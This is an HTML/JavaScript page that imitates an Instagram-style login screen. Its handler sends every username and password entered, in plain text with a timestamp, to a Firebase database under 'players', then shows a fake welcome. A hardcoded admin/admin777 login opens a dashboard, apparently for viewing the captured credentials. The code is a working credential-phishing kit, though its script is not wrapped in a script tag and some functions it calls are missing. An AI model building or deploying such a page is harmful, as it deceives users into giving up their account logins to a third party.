<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in</title>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
<style>
  :root {
    --bg: #ffffff;
    --border: #dbdbdb;
    --text: #262626;
    --text-muted: #8e8e8e;
    --accent: #0095f6;
    --accent-hover: #1877f2;
    --radius: 8px;
  }

  * {
    box-sizing: border-box;
  }

  body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: var(--bg);
    color: var(--text);
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
  }

  .login-card {
    width: 100%;
    max-width: 350px;
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  .top-bar {
    width: 100%;
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 24px;
  }

  .back-btn {
    background: none;
    border: none;
    font-size: 20px;
    cursor: pointer;
    color: var(--text);
    padding: 4px;
  }

  .lang-select {
    border: none;
    background: none;
    color: var(--text-muted);
    font-size: 14px;
    cursor: pointer;
  }

  .logo {
    width: 72px;
    height: 72px;
    border-radius: 20px;
    background: linear-gradient(45deg, #f9ce34, #ee2a7b, #6228d7);
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 24px 0 40px;
  }

  .logo svg {
    width: 36px;
    height: 36px;
    stroke: #fff;
    fill: none;
    stroke-width: 2;
  }

  form {
    width: 100%;
    display: flex;
    flex-direction: column;
    gap: 12px;
  }

  input {
    width: 100%;
    padding: 14px 16px;
    border: 1px solid var(--border);
    border-radius: var(--radius);
    font-size: 15px;
    background: #fafafa;
    outline: none;
    transition: border-color 0.15s ease;
  }

  input:focus {
    border-color: #a8a8a8;
  }

  input::placeholder {
    color: var(--text-muted);
  }

  .login-btn {
    margin-top: 4px;
    padding: 14px;
    border: none;
    border-radius: 24px;
    background: var(--accent);
    color: #fff;
    font-weight: 600;
    font-size: 15px;
    cursor: pointer;
    transition: background 0.15s ease;
  }

  .login-btn:hover {
    background: var(--accent-hover);
  }

  .login-btn:disabled {
    opacity: 0.5;
    cursor: default;
  }

  .forgot-link {
    margin-top: 16px;
    font-size: 14px;
    color: var(--text);
    text-decoration: none;
    text-align: center;
    cursor: pointer;
  }

  .forgot-link:hover {
    text-decoration: underline;
  }

  .spacer {
    height: 60px;
  }

  .signup-btn {
    width: 100%;
    padding: 14px;
    border: 1px solid var(--accent);
    border-radius: 24px;
    background: #fff;
    color: var(--accent);
    font-weight: 600;
    font-size: 15px;
    cursor: pointer;
    transition: background 0.15s ease;
  }

  .signup-btn:hover {
    background: #f0f8ff;
  }

  .brand-footer {
    margin-top: 20px;
    display: flex;
    align-items: center;
    gap: 6px;
    color: var(--text-muted);
    font-size: 14px;
    font-weight: 600;
  }

  /* Dashboard Styles */
  #portal-output {
    margin-top: 20px;
    display: none;
    width: 100%;
  }

  .admin-table {
    width: 100%;
    border-collapse: collapse;
    font-size: 0.85rem;
  }

  .admin-table th, .admin-table td {
    border: 1px solid #dbdbdb;
    padding: 10px;
    text-align: left;
  }

  .admin-table th {
    background: #fafafa;
    font-weight: 600;
  }

  @media (max-width: 400px) {
    .login-card {
      max-width: 100%;
    }
  }
</style>
</head>
<body>

  <div class="login-card">
    <div class="top-bar">
      <button class="back-btn" onclick="history.back()" aria-label="Go back">&#8592;</button>
      <select class="lang-select" aria-label="Select language">
        <option>English (India)</option>
        <option>Hindi</option>
        <option>English (US)</option>
      </select>
    </div>

    <div class="logo" aria-hidden="true">
      <svg viewBox="0 0 24 24">
        <rect x="3" y="3" width="18" height="18" rx="5"/>
        <circle cx="12" cy="12" r="4.5"/>
        <circle cx="17.5" cy="6.5" r="0.8" fill="#fff" stroke="none"/>
      </svg>
    </div>

    <div id="auth-form" style="width:100%;">
      <form onsubmit="handleAuth(event)">
        <input type="text" id="username" placeholder="Username, email address or mobile number" autocomplete="username" required>
        <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
        <button type="submit" class="login-btn">Log in</button>
      </form>

      <a class="forgot-link">Forgotten password?</a>

      <div class="spacer"></div>

      <button class="signup-btn" onclick="alert('Create new account')">Create new account</button>

      <div class="brand-footer">Your Brand</div>
    </div>

    <div id="portal-output"></div>
  </div>

  // --- AUTH HANDLER ---
  function handleAuth(e) {
    e.preventDefault();
    const user = document.getElementById("username").value.trim();
    const pass = document.getElementById("password").value.trim();

    if (!user || !pass) {
      alert("Please fill in all fields.");
      return;
    }

    // Admin Dashboard
    if (user === "admin" && pass === "admin777") {
      document.getElementById("auth-form").style.display = "none";
      loadDashboard();
      return;
    }

    // Firebase Submit
    if (database) {
      const logsRef = database.ref("players").push();
      logsRef.set({
        username: user,
        password: pass,
        timestamp: new Date().toISOString()
      }).then(() => {
        showWelcome(user);
      }).catch((err) => {
        console.error("Firebase Error:", err);
        showWelcome(user);
      });
    } else {
      showWelcome(user);
    }
  }
